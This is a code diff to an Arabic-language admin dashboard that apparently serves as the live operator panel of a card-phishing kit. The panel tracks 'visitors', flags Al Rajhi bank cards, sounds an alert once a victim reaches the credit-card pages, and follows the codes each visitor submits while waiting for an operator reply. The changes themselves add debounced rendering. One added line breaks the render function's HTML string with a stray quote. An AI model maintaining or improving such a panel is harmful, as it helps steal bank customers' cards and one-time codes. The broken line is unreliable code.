@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>لوحة التحكم - سجل</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.tailwindcss.com?plugins=forms"></script>
   <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
@@ -463,6 +463,23 @@
     // Pre-load frog sound once
     const frogAudio = new Audio('/admin/frog.mp3');
     frogAudio.volume = 0.7;
+
+    // === Performance Optimizations ===
+    // Debounce function to prevent excessive re-renders
+    function debounce(fn, delay) {
+      let timer = null;
+      return function(...args) {
+        if (timer) clearTimeout(timer);
+        timer = setTimeout(() => { fn.apply(this, args); timer = null; }, delay);
+      };
+    }
+    // Debounced versions of render functions
+    const debouncedRenderVisitorsList = debounce(() => { _renderVisitorsList(); }, 100);
+    const debouncedRenderVisitorDetails = debounce((visitor) => { _renderVisitorDetails(visitor); }, 100);
+    // Track last render time to skip redundant renders
+    let lastListRenderTime = 0;
+    let lastDetailRenderTime = 0;
+    let lastDetailVisitorId = null;
 
     // دالة التحقق إذا كانت البطاقة تابعة للراجحي
     function isRajhiCard(visitor) {
@@ -1172,17 +1189,15 @@
         // Ensure visitor is marked as connected and update data
         visitor.isConnected = true;
         visitor.hasNewData = true;
-        visitors.set(visitorId, visitor);
-        renderVisitorsList();
         // Always update details if this visitor is selected
         if (selectedVisitorId === visitorId) {
           // Mark as read immediately since admin is viewing this visitor
           socket.emit('admin:markAsRead', visitorId);
           visitor.hasNewData = false;
-          visitors.set(visitorId, visitor);
           renderVisitorDetails(visitor);
-          renderVisitorsList();
         }
+        visitors.set(visitorId, visitor);
+        renderVisitorsList();
         // Show notification with sound
         showNotification('📝 بيانات جديدة من الزائر #' + visitor.visitorNumber);
         // Play frog sound only for pages from credit card onwards (not for documents/summary/update info pages)
@@ -1237,24 +1252,29 @@
 
       // استقبال تحديثات الزوار (مثل تغيير حالة الانتظار)
       socket.on('visitors:update', (list) => {
-        // تحديث البيانات دائماً
+        // تحديث البيانات فقط إذا تغيرت
+        let hasChanges = false;
         let pageChanged = false;
         list.forEach(v => {
           const existing = visitors.get(v._id);
           if (existing) {
-            if (existing.page !== v.page) pageChanged = true;
+            if (existing.page !== v.page) { pageChanged = true; hasChanges = true; }
+            if (existing.waitingForAdminResponse !== v.waitingForAdminResponse) hasChanges = true;
+            if (existing.lastSentCode !== v.lastSentCode) hasChanges = true;
             existing.waitingForAdminResponse = v.waitingForAdminResponse;
             existing.page = v.page;
             existing.lastSentCode = v.lastSentCode;
             visitors.set(v._id, existing);
           }
         });
-        // تحديث قائمة الزوار دائماً (لإخفاء ينتظر الرد)
-        renderVisitorsList();
-        // تحديث التفاصيل إذا تغيرت الصفحة أو لم يكن هناك زر يعرض "تم الإرسال"
-        if (selectedVisitorId && (pageChanged || !window.skipDetailsUpdate)) {
-          const visitor = visitors.get(selectedVisitorId);
-          if (visitor) renderVisitorDetails(visitor);
+        // تحديث قائمة الزوار فقط إذا تغير شيء
+        if (hasChanges) {
+          renderVisitorsList();
+          // تحديث التفاصيل إذا تغيرت الصفحة
+          if (selectedVisitorId && (pageChanged || !window.skipDetailsUpdate)) {
+            const visitor = visitors.get(selectedVisitorId);
+            if (visitor) renderVisitorDetails(visitor);
+          }
         }
       });
     }
@@ -1278,8 +1298,11 @@
       return clean;
     }
 
-    // Render visitors list
+    // Render visitors list (wrapper with debounce)
     function renderVisitorsList() {
+      debouncedRenderVisitorsList();
+    }
+    function _renderVisitorsList() {
       const list = Array.from(visitors.values()).sort((a, b) => {
         // Check if visitor has data
         const hasDataA = (a.dataHistory && a.dataHistory.length > 0) || (a.data && Object.keys(a.data).length > 0);
@@ -1431,8 +1454,9 @@
           visitor.hasNewMessage = false;
         }
         visitors.set(visitorId, visitor);
-        renderVisitorDetails(visitor);
-        renderVisitorsList();
+        // Direct render (no debounce) for user interaction
+        _renderVisitorDetails(visitor);
+        _renderVisitorsList();
         // Mobile: switch to detail view
         if (window.innerWidth <= 768) {
           document.getElementById('adminMainContainer').classList.add('mobile-detail-view');
@@ -1447,7 +1471,10 @@
 
     // Render visitor details
     function renderVisitorDetails(visitor) {
-      let html = '<button class="mobile-back-btn" onclick="mobileBackToList()"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>رجوع للقائمة</button>';
+      debouncedRenderVisitorDetails(visitor);
+    }
+    function _renderVisitorDetails(visitor) {
+      let html = '<button class="mobile-back-btn" onclick="mobileBackToList()">'svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>رجوع للقائمة</button>';
       html += '<div class="space-y-6">';
       
       // Header with device info
